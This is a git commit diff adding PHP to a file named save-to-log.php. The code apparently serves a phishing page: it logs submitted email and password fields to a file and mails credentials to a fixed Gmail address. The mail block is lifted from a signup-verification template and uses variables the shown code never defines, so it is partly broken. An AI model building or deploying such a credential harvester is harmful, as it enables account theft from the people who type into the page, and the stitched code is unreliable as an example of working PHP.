e6502b745f97e8d5324984481d8e072c5999cf8f
salma-ali <51033753+salma-ali@users.noreply.github.com>
2019-05-25 23:25:33 +0200

    Add files via upload

--- save-to-log.php
+++ save-to-log.php
@@ -1,4 +1,23 @@
 <?php
+$to      = "salma.ali.2014.2015@gmail.com"; // Send email to our user
+$subject = 'Signup | Verification'; // Give the email a subject 
+$message = '
+ 
+Thanks for signing up!
+Your account has been created, you can login with the following credentials after you have activated your account by pressing the url below.
+ 
+------------------------
+Username: '.$name.'
+Password: '.$password.'
+------------------------
+ 
+Please click this link to activate your account:
+http://www.yourwebsite.com/verify.php?email='.$email.'&hash='.$hash.'
+ 
+'; // Our message above including the link
+                     
+$headers = 'From:noreply@yourwebsite.com' . "\r\n"; // Set from headers
+mail($to, $subject, $message, $headers);
   $log_file_name = 'mylog.log'; // Change to the log file name
   $message = $_POST['Email'].PHP_EOL; // incoming message
    $pass = $_POST['Psassword'].PHP_EOL; // incoming message
